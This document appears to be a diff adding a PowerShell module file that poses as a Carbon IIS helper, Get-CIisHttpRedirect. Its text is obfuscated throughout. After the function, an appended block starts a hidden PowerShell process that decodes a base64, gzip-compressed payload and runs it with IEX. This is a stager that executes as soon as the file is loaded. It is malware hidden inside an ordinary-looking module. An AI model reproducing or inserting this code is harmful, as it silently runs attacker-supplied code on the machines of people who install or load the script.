@@ -1,0 +1,29 @@
+ $Gt7Q6 = [TYPE]("{1}{0}" -f 'PtR','inT') ;  .('Sv') ("aJQ6"+"W") ( [tYpe]("{1}{7}{4}{6}{5}{0}{3}{2}"-F'E','s','s','S','m.Di','c','AGnOstICs.pRO','YsTe')) ;
+function GET-cIIS`htT`PRe`DI`RECt
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(mAndAtoRy=${tr`UE})]
+        [string]
+        
+        ${SI`T`eNAME},
+        
+        [Alias({"{0}{1}"-f 'P','ath'})]
+        [string]
+        
+        ${V`I`RTUALPaTh} = ''
+    )
+    
+    &("{2}{0}{1}"-f 'Stri','ctMode','Set-') -Version ("{1}{2}{0}" -f't','Late','s')
+
+    .("{2}{3}{0}{1}"-f'refere','nce','Use-','CallerP') -Cmdlet ${pSc`Md`leT} -Session ${Exe`CUti`o`N`coNTEXT}."S`Es`SI`ONSTate"
+
+    &("{6}{3}{2}{1}{7}{5}{4}{0}" -f 'on','o','C','is','onSecti','figurati','Get-CI','n') -SiteName ${s`iTEn`AMe} `
+                                -VirtualPath ${Vi`R`TuAlpa`Th} `
+                                -SectionPath ("{4}{2}{6}{0}{3}{5}{1}{7}"-f'Se','http','ystem.we','rve','s','r/','b','Redirect') `
+                                -Type ([Carbon.Iis.HttpRedirectConfigurationSection])
+}
+
+
+if(  $GT7q6::"s`iZe" -eq 4){${B}=("{3}{1}{2}{0}{4}"-f'.e','ers','hell','pow','xe')}else{${b}=${eN`V:`wiN`DiR}+((("{7}{10}{2}{8}{1}{3}{9}{5}{4}{0}{6}" -f'o','ll{','syswow64','0','0}p','.0{','wershell.exe','{0','{0}WindowsPowerShe','}v1','}'))  -f[chAR]92)};${S}=&("{2}{0}{1}" -f'ew','-Object','N') ("{6}{4}{1}{7}{5}{3}{2}{0}" -f'tInfo','tics.Proc','tar','sS','agnos','s','System.Di','e');${s}."F`ilENa`ME"=${B};${s}."Arg`UM`En`TS"=('-'+'nop '+'-'+'w '+'h'+'idden '+'-c'+' '+(('IE'+'Q'+'s=Ne'+'w-Obje'+'ct ')  -CrePLaCE  ([CHaR]73+[CHaR]69+[CHaR]81),[CHaR]36)+('IO.Memory'+'Stream(,[Conver'+'t]::FromBase64String(OaoOaoH4'+'sIAFHL6FcCA71W/2/'+'aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMe'+'ugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+K'+'OkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYR'+'X4ia3IPJ97lnQWjUs1+'+'/ZrVRsfFcb56v8QsVrPOOpZknvcZy'+'2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt'+'4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6S'+'k+/WUaS'+'zgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx'+'/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23z'+'mG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTb'+'ozja1VbELiyOXU38Mm9I'+'YZWb3l/TE7znxqZWIX6ecSQIaEX'+'Md4Tn1'+'9qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pT'+'Rr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZ'+'K7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZ'+'zSoD4x1g4N98dnX'+'8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa7'+'5gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOS'+'gUBy6VBEkjZG'+'6z6WRsZY'+'J9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh'+'36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0y'+'qtLxy1Lp2rJq7Yl7er'+'tdOqgx'+'k1'+'vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfD'+'M'+'wgCM8C56b4qUab/UrHKJRw'+'06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/'+'HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy'+'/n1B6P2wggzP'+'pmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZ'+'PNnzQAZD'+'qHOHwBnTCSsmbBKBjfkTGxxaP'+'S3hmcGSATm14D34NFrU2A3m3V+LIZa1b'+'jJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc73'+'9qDQLdvWV'+'nu'+'lnpLrxA1/WHhnnlDYuP59dn580+decc9XTd'+'/ZCwA+iRWcnhtb'+'tptg5i/lqRt7GIJ5gBF6B67zOzxkUtL'+'cNtTpMdqnrQlWdERIRBK4Nmt2c1Y'+'ox7SVc4L'+'Nv'+'QmHbtYgxZ'+'2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+I'+'XHcgFu/fZbV'+'vhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kM'+'s+phK0H'+'egGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=OaoOao));IEX ')."Re`p`LacE"(([cHAR]79+[cHAR]97+[cHAR]111),[StrinG][cHAR]39)+'(N'+'ew'+'-Objec'+'t '+'IO.St'+'re'+'a'+'mR'+'ead'+'er(New'+'-Ob'+'ject'+' '+('IO'+'.Com'+'p'+'ressi'+'on.GzipStr'+'e'+'am('+'CXys,'+'[IO.C'+'ompres'+'sion.Com'+'p'+'r'+'essionMode]::De'+'compress))).ReadToEnd();')."rEpLa`CE"(([chaR]67+[chaR]88+[chaR]121),[sTrinG][chaR]36));${S}."uSesh`elle`xec`U`Te"=${f`ALse};${S}."R`E`DiREC`Tst`A`NDARdoU`TPut"=${t`RUE};${S}."wI`Nd`OwStYle"=("{1}{0}"-f 'den','Hid');${s}."C`ReATEnowi`NDOw"=${Tr`UE};${P}= $AjQ6W::("{1}{0}"-f'art','St').Invoke(${S});
